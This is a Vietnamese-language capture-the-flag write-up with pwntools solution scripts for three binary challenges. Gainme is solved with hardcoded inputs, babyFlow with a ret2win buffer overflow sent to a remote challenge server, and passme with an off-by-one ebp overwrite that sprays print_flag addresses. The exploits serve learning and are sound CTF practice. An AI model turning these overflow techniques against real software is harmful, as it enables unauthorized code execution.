# Gainme
<details>
<summary> Gainme </summary>
 
## level 1
  ![image](https://user-images.githubusercontent.com/111769169/219845961-39a75598-d234-4da9-8477-5e22544c945c.png)  
  chỉ đơn giản là so sánh chuỗi ta nhập vào với ICTF4 là xong  
## level 2
  ![image](https://user-images.githubusercontent.com/111769169/219845852-185dbf47-5107-4a91-9026-251234e2f7b3.png)  
  đại loại là chuỗi s được lưu một chuỗi nào đó đã có trong chương trình  
  lúc gdb đến đoạn strlen ta thấy chương trình đang đếm chuỗi này
  ![image](https://user-images.githubusercontent.com/111769169/219846304-e4c7229a-72ff-441b-b384-d6832be083d6.png)
  cùng với đoạn  ![image](https://user-images.githubusercontent.com/111769169/219846526-67da47a2-c21f-4747-8ab6-46e8b6a493d5.png)  
  thì chúng ta khẳng định là nó đang so sánh thanh dl và al là chuỗi ta nhập vào với chuỗi trong gdb
## level 3
  ![image](https://user-images.githubusercontent.com/111769169/219846653-4e77e24c-933b-42b0-b798-86b63da1d513.png)
  ta thấy chương trình đang so sánh chuỗi nhập vào với 0xDEADBEEF
## level 4
  ![image](https://user-images.githubusercontent.com/111769169/219846707-f36bdcd7-58c0-4968-bd0d-1a7790c496a6.png)
  điều kiện strlen(s) phải lớn hơn 3
  đây thì đại loại giải phương trình bậc 3 =)))
  nghiệm là 1
# script
```python
from pwn import *
#dasDASQWgjtrkodsc
#-559038737
exe = ELF("./Gainme", checksec = False)
p = process(exe.path)

p.sendlineafter(b"0: ", b"ICTF4")                   #level1
p.sendlineafter(b"1: ", b"dasDASQWgjtrkodsc")       #level2
p.sendlineafter(b'2: ', p32(0xDEADBEEF)) #level3
p.sendlineafter(b'3: ', b'1')                       #level4
p.interactive()
```
## Chú ý
để đổi 1 số âm sang hex ta có thể p32(-10000, sign = True)

 </details>

# babyFlow
<details>
<summary> babyflow </summary>
 
  ta thấy hàm gets có thể đoán được nó có BOF
  ![image](https://user-images.githubusercontent.com/111769169/219847378-e4e3ddf8-5d26-4c29-8942-f3b0ddbb0e23.png)
  ___
  ở đây ta hàm strcpy() sẽ lấy chuỗi ta nhập vào và copy vào dest, mà dest cũng chỉ có 16byte và có hàm thực thi /bin/sh nên ta có thể BOF 
  ![image](https://user-images.githubusercontent.com/111769169/219847745-1b1e755a-971c-4086-9ec8-1886b295ecc9.png)
  bây giờ ta tìm offset để ret2win là 24  
  ![image](https://user-images.githubusercontent.com/111769169/219847816-83e0ff9c-1b99-4f52-9f4a-9be9adb00317.png)
```python3
from pwn import *

exe = ELF("./babyFlow", checksec = False)
#p = process("./babyFlow")

p = remote("143.198.219.171", 5000)

input()
payload = b'a' * 24 + p32(exe.sym['get_shell'])
p.sendlineafter(b' me?\n', payload)
p.interactive()
```
</details>

# passme
<details>
 <summary> passme </summary>
 
 ![image](https://user-images.githubusercontent.com/111769169/219850565-ca85ea7b-1530-46c9-952b-f4cf4fc77b69.png)
 
  ban đầu ta nghĩ nó sẽ so sánh 17.022023 với chuỗi ta nhập vào  
  tuy nhiên 17.022023 là long double còn trong file 32bit thì chỉ là float  
  đến đây em được hint là lỗi off-by-one offset là 68 và 1 byte null do hàm gets để lại nên địa chỉ ebp bị thay đổi và nhảy lung tung (giống dạng $rbp)  
  do là nhảy lung tung, có thể nhảy vào giữ payload nên ta có thể để payload toàn là ret về print_flag để tăng cơ hội nhảy vào print_flag  

```python3
 from pwn import *
exe = ELF("./passme", checksec = False)

p = process(exe.path)
payload = p32(exe.sym['print_flag']) *  17
p.sendafter(b'name: \n', payload)

p.interactive()
```
 
</detail>
